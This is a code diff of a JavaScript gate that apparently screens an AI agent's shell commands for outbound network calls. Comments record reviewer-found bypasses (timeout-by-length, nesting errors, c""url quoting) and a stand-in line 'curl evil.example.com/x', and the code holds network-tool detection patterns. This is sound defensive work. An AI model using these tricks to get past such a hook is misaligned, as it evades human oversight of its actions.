-      if (/[oO]$/.test(w) && j + 1 < toks.length) j++ // -o pipefail, -euo pipefail, +O extglob
-      last = toks[j].end
+      if (/[oO]$/.test(w) && j + 1 < ws.length) j++ // -o pipefail, -euo pipefail, +O extglob
     }
-    if (!hasC) continue
-    // $'...' (ANSI-C quoting) is one word too; shellWords would keep its `$` as text.
-    const rest = orig.slice(last, b).replace(/^\s*\$'/, "'")
-    const str = shellWords(rest)[0]
-    if (str) out.push(str)
+    if (hasC && ws[j]) out.push(ws[j])
   }
   return out
 }
-// Text of the heredoc bodies announced inside orig.slice(a,b) (not a `<<<` here-string: its text is
-// already in the span); the first body starts on the line after the span end.
-function heredocBodies(orig, a, b) {
-  const seg = orig.slice(a, b); const out = []
-  let from = orig.indexOf('\n', b); if (from === -1) return out
-  for (const m of seg.matchAll(/(?<!<)<<(?!<)-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_]\w*))/g)) {
-    const tag = m[1] ?? m[2] ?? m[3]
-    const endRx = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm')
-    const rest = orig.slice(from + 1); const rel = endRx.exec(rest)
-    if (!rel) break
-    out.push(rest.slice(0, rel.index)); from = from + 1 + rel.index + rel[0].length
-  }
-  return out
+// Text of the heredoc bodies announced in segment s (not a `<<<` here-string: its text is already in the
+// span), from the lexer's heredocs; an unterminated body runs to the end, as the shell reads it.
+function heredocBodies(r, s) {
+  return r.lxB.heredocs.filter((h) => h.op >= s.start && h.op < s.end).map((h) => r.cp.slice(h.bodyStart, h.bodyEnd).join(''))
+}
+// The segment before segs[k] hands its output to segs[k] through a pipe (`|` or `|&`, not `||`).
+function pipedFrom(r, k) {
+  if (k === 0) return false
+  let p = r.segs[k - 1].end
+  while (p < r.segs[k].start && (r.blankCp[p] === ' ' || r.blankCp[p] === '\t')) p++
+  return r.blankCp[p] === '|' && r.lxB.cls[p] === 'c' && r.blankCp[p + 1] !== '|'
 }
 
+// The unparseable-external reserve (Klodel 42889) on a text: quotes and backslashes off (so c""url counts), an
+// external URL literal and a network tool, or an interpreter with a network primitive.
+function reserveHit(text, vendorHosts, vendorDomains) {
+  const raw = text.replace(/['"\\]/g, '')
+  return hasExternalLiteral(raw, vendorHosts, vendorDomains)
+    && (NET_TOOL_RAW.test(raw) || (INTERPRETER_RAW.test(raw) && NET_PRIMITIVE.test(raw)))
+}
+// The cheap reading, for a command the full reading cannot judge (too long, or an internal error), from the raw text
+// (backslash-newlines, quotes and backslashes off). It denies wherever the full reading would deny for a network
+// tool, an interpreter, a shell or the gh-pr pin; it does not repeat subst-too-deep / shell-c-too-deep (an external
+// literal in a deep nesting with none of those named), nor, after an internal error, a curl that names a URL literal
+// besides its unread destination:
+//   'external': an external URL literal with a network tool, an interpreter with a network primitive (reserveHit),
+//               or a shell (a stdin-fed shell denies on any external literal it is fed: stdin-shell-external);
+//   'network':  a network tool, or gh-pr.mjs (its pin is fail-closed, GHPRPIN P2). In the `strict` reading (too long)
+//               always; after an internal error only when the text holds no URL literal at all (Viktor 2026-11-15
+//               LOW 1: `curl $U`, `curl evil.example.com/x`), so a dashboard call to its literal http://localhost
+//               URL still passes a crashed gate, as the header promises.
+const SHELL_RAW = /(?<![\w.-])(?:bash|sh|zsh|dash|ksh)(?![\w-])/
+function cheapVerdict(command, vendorHosts, vendorDomains, strict) {
+  const text = String(command ?? '').replace(/\\\n/g, '')
+  const raw = text.replace(/['"\\]/g, '')
+  if (reserveHit(text, vendorHosts, vendorDomains) || (SHELL_RAW.test(raw) && hasExternalLiteral(raw, vendorHosts, vendorDomains))) return 'external'
+  if (raw.includes('gh-pr.mjs')) return 'network'
+  if (NET_TOOL_RAW.test(raw) && (strict || !new RegExp(URL_RE.source, 'i').test(raw))) return 'network'
+  return null
+}
+// Above this length the full reading is not tried: parts of it grow faster than the text (Viktor 2026-11-15 HIGH 6:
+// three shapes of 100-324 KB took 10-47 s, past the hook's 10 s timeout, which allows, and bash ran the curl). The
+// longest real command in the fleet's 141 979 was 26 180 characters. A long command is judged by the cheap, strict
+// reading: an allow only without any network tool, gh-pr.mjs, or an external URL literal next to an interpreter or a
+// shell. A literal-only rule would have let `curl evil.example.com/x` padded past the cap through.
+export const MAX_COMMAND_CHARS = 65536
+// An internal error while reading a command was an allow: the hook's catch lets the call through (Viktor 42933
+// HIGH 5: a RangeError from a deep nesting, and bash ran the curl after it). Whatever throws now, the cheap reading
+// decides; without a hit the error goes on to the caller as before.
 export function classify(command, depth = 0, vendorHosts = new Set(), vendorDomains = new Set(), scope = null) {
-  const norm = String(command ?? '').replace(/\\\r?\n/g, ' ')
-  const { stripped: orig, inners } = liftSubstitutions(norm)
-  const outer = scope ?? { env: {}, loops: {}, externalLiteral: hasExternalLiteral(norm, vendorHosts, vendorDomains) }
-  const masked = maskInertLiterals(orig)
-  const parseable = masked !== null && masked.length === orig.length
+  try {
+    if (typeof command === 'string' && command.length > MAX_COMMAND_CHARS) {
+      const why = cheapVerdict(command, vendorHosts, vendorDomains, true)
+      return why ? { deny: true, reason: `command-too-long-${why}`, hosts: [] } : { deny: false, reason: 'command-too-long', hosts: [] }
+    }
+    return classifyRead(command, depth, vendorHosts, vendorDomains, scope)
+  } catch (e) {
+    const why = cheapVerdict(command, vendorHosts, vendorDomains, false)
+    if (why) return { deny: true, reason: `internal-error-${why}`, hosts: [] }
+    throw e
+  }
+}
+function classifyRead(command, depth, vendorHosts, vendorDomains, scope) {
+  const r = readCommand(String(command ?? ''))
+  const outer = scope ?? { env: {}, loops: {}, externalLiteral: hasExternalLiteral(r.codeText, vendorHosts, vendorDomains) }
+  const segText = (s) => r.blankCp.slice(s.start, s.end).join('')
   // This command's own assignments and loops override the enclosing ones (a substitution runs in a
   // subshell that inherits them). Collected before the inner commands are judged, so the curl in
   // `u=<url>; x=$(curl -s $u)` reads u.
-  const env = { ...outer.env, ...(parseable ? collectAssignments(orig, masked) : {}) }
-  const loops = { ...outer.loops }
-  if (parseable) {
-    for (const [v, vals] of Object.entries(collectLoops(orig, masked, env))) loops[v] = [...(loops[v] ?? []), ...vals]
-  }
+  // Viktor 2026-11-15 (b58374d7, HIGH 6): copying both into every frame was O(variables) per frame, quadratic in the
+  // command (12 000 `vN=$(echo a); ` took 14-17 s, past the hook's timeout, which allows). env is only ever looked up by
+  // name (expand), so a frame's own assignments go on a layer over the enclosing env; loops is read by key order
+  // (loopVariants), so it is copied only when the frame has loops of its own.
+  const own = collectAssignments(r)
+  const env = Object.keys(own).length ? Object.assign(Object.create(outer.env), own) : outer.env
+  const ownLoops = Object.entries(collectLoops(r, env))
+  const loops = ownLoops.length ? { ...outer.loops } : outer.loops
+  for (const [v, vals] of ownLoops) loops[v] = [...(loops[v] ?? []), ...vals]
+  const inners = r.frames.filter((f) => f.inner !== null).map((f) => f.inner)
   if (depth < 4) {
     const inner = { env, loops, externalLiteral: outer.externalLiteral }
-    for (const sub of inners) { const r = classify(sub, depth + 1, vendorHosts, vendorDomains, inner); if (r.deny) return r }
-  } else if (inners.length && outer.externalLiteral) {
+    for (const sub of inners) { const res = classify(sub, depth + 1, vendorHosts, vendorDomains, inner); if (res.deny) return res }
+  } else if (r.frames.length && outer.externalLiteral) {
     // Past the depth limit the inner commands are not read. That was a pass (Viktor LOW, decfb196:
     // five nested $( ... ) around a curl); with an external URL literal in the command it denies.
     return { deny: true, reason: 'subst-too-deep', hosts: [] }
   }
-  if (!parseable) return { deny: false, reason: 'unparseable', hosts: [] }
-  const sp = spans(masked)
-  for (const [k, [a, b]] of sp.entries()) {
-    const mw = words(masked.slice(a, b))
+  for (const [k, s] of r.segs.entries()) {
+    const mw = r.segWords[k].map((w) => w.text)
     const i = commandWordAt(mw)
+    const text0 = segText(s)
     // GHPRPIN: a node span that names gh-pr.mjs passes only in the exact, pinned, stand-alone shape.
     // Read with this command's assignments and loop values expanded: `G=<path>/gh-pr.mjs; node $G` and
     // `for s in <path>/gh-pr.mjs; do node $s; done` name the script too (replay 2026-11-06: the first shape
     // passed unexamined). A value set in an EARLIER Bash call is not visible here (drift control, see above).
-    const pinText = [expand(orig.slice(a, b), env), ...(loopVariants(orig.slice(a, b), env, loops) ?? [])].find((t) => t.includes('gh-pr.mjs'))
+    const pinText = [expand(text0, env), ...(loopVariants(text0, env, loops) ?? [])].find((t) => t.includes('gh-pr.mjs'))
     if (pinText !== undefined) {
       const sw = shellWords(pinText)
       const at = commandWordAt(sw)
       if (at < sw.length && NODE_RUNTIME.test(sw[at].split('/').pop())) {
-        // The other spans must be empty: a heredoc body is already blanked in `masked`, and its closing
-        // delimiter line (`EOF`) is the only text that may stand there.
-        const delims = new Set([...orig.slice(a, b).matchAll(/<<-?\s*(['"]?)([A-Za-z_][A-Za-z0-9_]*)\1/g)].map((m) => m[2]))
-        const alone = depth === 0 && scope === null && !inners.length &&
-          sp.every(([x, y], j) => { const t = masked.slice(x, y).trim(); return j === k || !t || (j > k && delims.has(t)) })
+        // Alone: the only simple command of the whole text (a heredoc body, its terminator line and a comment
+        // are none), no command or arithmetic frame anywhere, and a text the lexer fully understood.
+        const alone = depth === 0 && scope === null && !r.frames.length && r.segs.length === 1 && !r.problems.length
         const why = ghPrPinVerdict(sw, alone)
         if (why) return { deny: true, reason: why, hosts: [] }
       }
@@ -749,23 +837,24 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
     // A shell's -c <string> (and `env -S <line>`) is a command line of its own: judged like a substitution,
     // with this command's assignments and loop values, up to the same depth (see shellCStrings). Before the
     // command-word check: `env -S '<line>'` has no command word of its own (card 74d46cd0).
-    const cStrings = shellCStrings(orig, masked, a, b)
+    const cStrings = shellCStrings(mw)
     if (cStrings.length && depth < 4) {
       const inner = { env, loops, externalLiteral: outer.externalLiteral }
-      for (const s of cStrings) { const r = classify(s, depth + 1, vendorHosts, vendorDomains, inner); if (r.deny) return r }
+      for (const str of cStrings) { const res = classify(str, depth + 1, vendorHosts, vendorDomains, inner); if (res.deny) return res }
     } else if (cStrings.length && outer.externalLiteral) {
       return { deny: true, reason: 'shell-c-too-deep', hosts: [] }
     }
     if (i >= mw.length) continue
     // The program arrives on stdin (heredoc, here-string, or the previous span of a pipe): judge the
     // program text itself, with the same localhost / private / vendor rules as everywhere else.
-    if (stdinFed(mw, i)) {
-      // Read from `norm`, not `orig`: liftSubstitutions does not know a second heredoc is a body, and
-      // lifts its `(...)` out of `orig` as if it were a subshell (offsets are the same in both).
-      const parts = [norm.slice(a, b), ...heredocBodies(norm, a, b)]
-      if (k > 0) {
-        const [pa, pb] = sp[k - 1]
-        if (masked[pb] === '|' && masked[pb + 1] !== '|') parts.push(norm.slice(pa, pb), ...heredocBodies(norm, pa, pb))
+    // The words are read with this command's assignments expanded: a quoted word is a word now (card
+    // fae0712e), and `S=-; python3 "$S" <<'PY'` reads its program from stdin.
+    if (stdinFed(mw.map((w) => expand(w, env)), i)) {
+      // Read from the text before blanking: a substitution in an unquoted heredoc body is part of the program.
+      const parts = [r.cp.slice(s.start, s.end).join(''), ...heredocBodies(r, s)]
+      if (pipedFrom(r, k)) {
+        const p = r.segs[k - 1]
+        parts.push(r.cp.slice(p.start, p.end).join(''), ...heredocBodies(r, p))
       }
       const payload = parts.join('\n')
       const hostsIn = () => [...new Set([...payload.matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf))]
@@ -785,8 +874,8 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
     // Every loop reading AND the plain one: a loop variable can share its name with an assignment
     // elsewhere in the command (`for u in <local>; do ...; done; u=<external>; curl "$u"`), and a
     // loop-only reading would let the assigned value go unjudged.
-    const plain = expand(orig.slice(a, b), env)
-    const variants = loopVariants(orig.slice(a, b), env, loops)
+    const plain = expand(text0, env)
+    const variants = loopVariants(text0, env, loops)
     for (const text of [plain, ...(variants ?? [])]) {
       const cmd = mw[i].split('/').pop()
       let target = null
@@ -815,7 +904,16 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
       return { deny: true, reason: 'curl-unresolved-destination', hosts: [] }
     }
   }
-  return { deny: false, reason: null, hosts: [] }
+  // Klodel 42889 (four HIGHs of one class: a lexer misreading left problems, and the allow below let a curl
+  // through that bash ran): text the lexer did not fully understand denies when its RAW text (quotes and
+  // backslashes off, so c""url counts; comments too, since a misread may have made the URL a comment) holds an
+  // external URL literal and a network tool, or an interpreter with a network primitive.
+  if (r.problems.length && reserveHit(r.norm, vendorHosts, vendorDomains)) {
+    return { deny: true, reason: 'unparseable-external', hosts: [] }
+  }
+  // Nothing denied. Text the lexer did not fully understand stays an allow, as an unparseable command was
+  // before (now judged first on what the lexer read, and past the reserve above).
+  return { deny: false, reason: r.problems.length ? 'unparseable' : null, hosts: [] }
 }
 
 const GATE_MSG =
@@ -837,9 +935,14 @@ const GH_PR_PIN_MSG =
   'node-kapcsolo; nincs ; && | vagy $(...); nem bash -c-ben. Kimenet fajlba: > <fajl>; PR-szoveg: --body-file <fajl> ' +
   "vagy --body-file - <<'EOF'. A fajl sha256-janak egyeznie kell a store/egress-script-pins.json pinjevel; " +
   'uj valtozat = Viktor-atnezes a pontos SHA-ra, utana owner-pin.'
+// A command past MAX_COMMAND_CHARS is not read in full (fae0712e h8): the deny says how to split it.
+const TOO_LONG_HINT =
+  ` A parancs tul hosszu (${MAX_COMMAND_CHARS} karakter folott) a teljes olvasashoz: a nagy szoveget ird fajlba ` +
+  '(Write eszkoz), es a parancs csak hivatkozzon ra (--data-binary @fajl), vagy bontsd tobb parancsra.'
 export function gateMessage(r) {
   if (/^gh-pr-pin-/.test(r.reason ?? '')) return `${GH_PR_PIN_MSG} (ok: ${r.reason})`
-  const hint = /^(?:stdin-interpreter|one-liner)-/.test(r.reason ?? '') ? INTERPRETER_HINT : ''
+  const hint = /^(?:stdin-interpreter|one-liner)-/.test(r.reason ?? '') ? INTERPRETER_HINT
+    : /^command-too-long-/.test(r.reason ?? '') ? TOO_LONG_HINT : ''
   return `${GATE_MSG}${hint} (${r.hosts.length ? `hoszt: ${r.hosts.join(', ')}` : `ok: ${r.reason}`})`
 }
 function isInvokedDirectly() {
